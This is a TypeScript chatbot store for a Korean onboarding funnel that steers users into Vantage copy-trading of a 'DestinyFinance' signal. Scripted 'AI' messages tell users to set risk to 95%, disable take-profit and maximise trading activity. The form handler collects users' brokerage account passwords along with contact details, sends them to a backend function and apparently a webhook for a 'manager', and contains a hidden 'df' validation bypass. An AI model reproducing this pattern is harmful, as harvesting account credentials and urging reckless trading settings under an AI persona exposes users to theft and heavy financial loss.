                  content: '📱 **Vantage 앱에서:**\n1. 홈 화면 "입금" 버튼 클릭\n2. **Copy Trading 계좌** 선택 확인\n3. 입금 금액 입력 후 계속 버튼 클릭\n4. 입금 방법 선택 (신용카드, 로컬 은행 송금, 암호화폐 등)\n5. **제출** 버튼 클릭',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-10-action',
                  content: '',
                  sender: 'ai',
                  type: 'action_button',
                  timestamp: new Date(),
                  animate: false,
                  buttons: [
                    {
                      label: '입금을 완료했어요',
                      type: 'primary',
                      action: () => {
                        get().addMessage({
                          id: `user-response-${Date.now()}`,
                          content: '입금을 완료했어요',
                          sender: 'user',
                          type: 'text',
                          timestamp: new Date(),
                          animate: false
                        });
                        
                        setTimeout(() => {
                          get().proceedToStep(11);
                        }, 800);
                      }
                    }
                  ]
                }
              ]);
              
              set({ currentStep: 10, isProcessing: false });
              break;
            }

            case 11: {
              get().addMessageGroup([
                {
                  id: 'step-11-title',
                  content: '11단계: AI 전략 선택 및 Copy Trading 설정',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-11-intro',
                  content: '마지막 단계예요! AI 전략을 선택하고 카피 설정을 완료해볼게요.',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-11-search',
                  content: '🔍 **전략 검색:**\nVantage 앱 하단의 **"발견"** 탭\n→ 상단의 "시그널" 클릭\n→ 검색창에 **"DestinyFinance"** 입력\n→ **진입**을 클릭하세요.\n→ **카피** 버튼을 클릭하세요.',
                  sender: 'ai',
                  type: 'info_box',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-11-settings',
                  content: '⚙️ **카피트레이딩 설정:**\n\n**복사 모드**: 등가 사용 증거금\n- 마스터와의 잔액에 비례하여 랏 사이즈 자동 설정\n\n**투자 금액**: 입금한 금액 입력\n- 예시: $3,000 입력 시 잔고+보너스=3,000 산출\n\n**위험 관리: 95%로 변경**\n- 신호제공자와 최대한 비슷한 수준으로 따라가기 위한 설정\n- 총 투자금 및 수익, 출금 등의 합산으로 매월 계산되는 잔고의 95%\n\n**익절**: 비활성화 유지\n- 신호제공자가 주문을 청산하기까지 계속 따라감\n\n**어시스턴트**: 활성화 유지\n- 최소 카피 랏수보다 높게 하여 거래 활동 극대화\n\n**포지션 오더**: 활성화 변경\n- 카피 시작과 동시에 현재 시장가 기준으로 주문 진입\n\n**제출** 버튼을 클릭하세요.',
                  sender: 'ai',
                  type: 'text',
                  timestamp: new Date(),
                  animate: false,
                },
                {
                  id: 'step-11-action',
                  content: '',
                  sender: 'ai',
                  type: 'action_button',
                  timestamp: new Date(),
                  animate: false,
                  buttons: [
                    {
                      label: 'Copy Trading 시작하기',
                      type: 'primary',
                      action: () => {
                        get().addMessage({
                          id: `user-response-${Date.now()}`,
                          content: 'Copy Trading 시작하기',
                          sender: 'user',
                          type: 'text',
                          timestamp: new Date(),
                          animate: false
                        });
                        
                        setTimeout(() => {
                          get().showCompletionMessage();
                        }, 800);
                      }
                    }
                  ]
                }
              ]);
              
              set({ currentStep: 11, isProcessing: false });
              break;
            }

            default:
              set({ isProcessing: false });
          }
        }, 800);
      },

      updateFormField: (messageId: string, fieldId: string, value: string) => {
        set((state) => ({
          messages: state.messages.map(message => 
            message.id === messageId && message.formFields
              ? {
                  ...message,
                  formFields: message.formFields.map(field =>
                    field.id === fieldId ? { ...field, value } : field
                  )
                }
              : message
          )
        }));
      },

      submitUserForm: (messageId: string) => {
        const { messages, isProcessing } = get();
        
        if (isProcessing) return;
        
        set({ isProcessing: true });
        
        const formMessage = messages.find(m => m.id === messageId);
        
        if (formMessage && formMessage.formFields) {
          const formData: any = {};
          formMessage.formFields.forEach(field => {
            formData[field.id] = field.value;
          });

          // Developer skip mode - bypass validation and database storage
          if (formData.server?.toLowerCase() === 'df') {
            const dummyAccountData = {
              accountId: '12345678',
              password: 'test1234',
              server: 'TestServer-Demo'
            };
            
            get().updateUserData(dummyAccountData);
            
            get().addMessage({
              id: `success-${Date.now()}`,
              content: '✅ **프로그램 시작 요청이 접수되었습니다!**\n\n매니저가 곧 **AI 자동투자**를 시작해드릴게요.',
              sender: 'ai',
              type: 'success_box',
              timestamp: new Date(),
              animate: false
            });

            setTimeout(() => {
              if (messageId === 'step-6-form' || messageId === 'skip-step-6-form') {
                console.log('Dev mode: Form submitted, proceeding to step 7');
                set({ isProcessing: false });
                get().proceedToStep(7);
              } else {
                set({ isProcessing: false });
              }
            }, 800);
            
            return; // Skip all validation and database storage
          }

          const requiredFields = formMessage.formFields.filter(f => f.required);
          const missingFields = requiredFields.filter(f => !f.value.trim());
          
          if (missingFields.length > 0) {
            get().addMessage({
              id: `warning-${Date.now()}`,
              content: '⚠️ **모든 필수 항목을 입력해주세요.**',
              sender: 'ai',
              type: 'warning_box',
              timestamp: new Date(),
              animate: false
            });
            set({ isProcessing: false });
            return;
          }

          get().updateUserData(formData);
          
          const saveToDatabase = async () => {
            if (messageId === 'step-6-form' || messageId === 'skip-step-6-form') {
              try {
                const { userData } = get();
                
                const { data, error } = await supabase.functions.invoke('store-user-account', {
                  body: {
                    firstName: userData.firstName,
                    lastName: userData.lastName,
                    email: userData.email,
                    phone: userData.phone,
                    accountId: formData.accountId,
                    password: formData.password,
                    server: formData.server,
                    sessionId: userData.sessionId || crypto.randomUUID(),
                    referrerName: userData.referrerName,
                    accountType: userData.accountType || 'demo'
                  }
                });

                if (error) {
                  console.error('Error storing user account:', error);
                } else {
                  console.log('User account stored and webhook sent successfully');
                }
              } catch (error) {
                console.error('Account storage operation failed:', error);
              }
            }
          };
          
          saveToDatabase();
          
          get().addMessage({
            id: `success-${Date.now()}`,
            content: '✅ **프로그램 시작 요청이 접수되었습니다!**\n\n매니저가 곧 **AI 자동투자**를 시작해드릴게요.',
            sender: 'ai',
            type: 'success_box',
            timestamp: new Date(),
            animate: false
          });

          setTimeout(() => {
            if (messageId === 'step-6-form' || messageId === 'skip-step-6-form') {
              console.log('Step 6 form submitted, proceeding to step 7');
              set({ isProcessing: false });
              get().proceedToStep(7);
            } else {
              console.log('Form submitted but not step-6-form:', messageId);
              set({ isProcessing: false });
            }
          }, 800);
        } else {
          set({ isProcessing: false });
        }
      },
    }),
    {
      name: 'cfd_chat_ko_v2',
      partialize: (state) => ({
        currentStep: state.currentStep,
        userData: state.userData,
        locale: state.locale,
      }),
      onRehydrateStorage: () => (state) => {
        if (state && Array.isArray(state.executedSteps)) {
          state.executedSteps = new Set(state.executedSteps);
        }
      },
    }
  )
);
